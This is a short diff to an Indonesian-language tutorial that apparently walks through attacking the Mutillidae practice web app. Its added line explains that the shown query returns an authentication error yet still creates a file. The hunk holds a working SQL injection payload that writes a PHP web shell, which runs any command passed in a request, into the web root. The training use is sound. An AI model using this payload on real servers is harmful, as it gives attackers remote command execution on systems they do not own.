@@ -15,4 +15,4 @@ AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivit
 ```
 ' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/mutillidae/execute_command.php' -- 
 ```
-Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`.
+Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **execute_command.php**
